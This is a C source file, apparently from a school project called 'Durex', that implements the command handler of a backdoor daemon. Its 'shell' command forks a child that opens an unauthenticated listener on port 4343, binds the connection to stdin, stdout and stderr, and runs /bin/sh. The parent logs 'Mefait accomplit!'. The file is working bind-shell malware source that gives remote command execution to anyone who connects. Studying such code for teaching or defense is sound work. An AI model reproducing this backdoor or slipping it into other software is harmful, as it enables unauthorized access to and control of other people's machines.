/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server_command.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
/*   Updated: 2019/11/15 16:07:15 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "server.h"

extern char **environ;

static t_bool	server_cmd_help(t_client *client, t_server *server)
{
	char *help_content =	"Durex commands:\n"
							"\t'help' or ?''\t- Show this message.\n"
							"\t'exit'\t\t- Quit Durex.\n"
							"\t'shell'\t\t- Spawn a shell on port 4343.\n"
							"\t'uninstall'\t- Uninstall Durex.\n";
	if (!server || !client)
		return (false);
	send_text(help_content, client->socket);
	return (true);
}

static t_bool	server_cmd_shell(t_client *client, t_server *server)
{
	t_server	remote_shell;
	pid_t		pid;
	char		*sh[] = { "/bin/sh", NULL };
	t_client	*clt;

	if (!server || !client)
		return (false);
	if ((pid = fork()) < 0)
	{
		send_text("The remote shell has failed.\n", client->socket);
		durex_log("The remote shell has failed.", LOG_WARNING);
		return (false);
	}
	// Child
	else if (pid == 0)
	{
		close(server->socket);
		remote_shell.require_pass = false;
		if (create_server(&remote_shell, 4343, 1))
			if (new_client(&remote_shell))
			{
				clt = (t_client*)remote_shell.client_lst->content;
				close(client->socket);
				dup2(clt->socket, 0);
				dup2(clt->socket, 1);
				dup2(clt->socket, 2);
				execve(sh[0], sh, environ);
			}
		durex_log("The remote shell has failed.", LOG_WARNING);
		close(client->socket);
		close(remote_shell.socket);
		close(clt->socket);
	}
	// Father
	else
	{
		send_text("\033[33m•\033[0m Spawning a shell on port 4343 ...\n", client->socket);
		durex_log("Mefait accomplit!", LOG_INFO);
	}
	return (true);
}

static t_bool	server_cmd_exit(t_client *client, t_server *server)
{
	if (!server || !client)
		return (false);
	deco_client(client, server);
	return (true);
}

static t_bool	server_cmd_uninstall(t_client *client, t_server *server)
{
	if (!server || !client)
		return (false);
	send_text("Uninstall Durex [wip].\n", client->socket);
	durex_log("Uninstall Durex [wip]", LOG_WARNING);
	return (true);
}

static const t_cmd g_server_cmd[SERVER_CMD_NUMBER] =
{
 [HELP] = {"help", server_cmd_help},
 [HELP_ALIAS] = {"?", server_cmd_help},
 [UNINSTALL] = {"uninstall", server_cmd_uninstall},
 [SHELL] = {"shell", server_cmd_shell},
 [EXIT] = {"exit", server_cmd_exit},
};

void	server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_client *client)
{
	t_server_cmd cmd = -1;

	raw_cmd[cmd_size - 1] = (raw_cmd[cmd_size - 1] == '\n') ? '\0' : raw_cmd[cmd_size - 1];
	durex_log_with(raw_cmd, LOG_INFO, client_prefix, client);
	while (++cmd < SERVER_CMD_NUMBER)
	{
		if (!ft_strncmp(g_server_cmd[cmd].name, raw_cmd, cmd_size))
			g_server_cmd[cmd].func(client, server);
	}
	send_text(SERVER_PROMPT, client->socket);
}
